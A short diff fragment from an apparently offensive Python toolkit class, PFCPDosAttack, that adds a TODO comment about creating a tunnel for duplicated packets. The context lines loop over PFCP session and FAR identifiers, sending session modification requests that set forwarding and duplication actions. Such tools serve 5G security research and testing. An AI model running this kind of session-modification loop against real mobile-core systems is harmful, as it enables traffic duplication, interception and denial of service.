@@ -634,6 +634,7 @@ class PFCPDosAttack:
         for seid in range(1, session_range):
             
             for farId in range(1, far_range):
+                ############## TODO: Add duplicate parameters + outer header creation, we need to create a new tunnel to send duplicated packets
                 packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farId, apply_action=["FORW", "DUPL"])
                 res = sr1(packet)
                 pfcp_cause = None
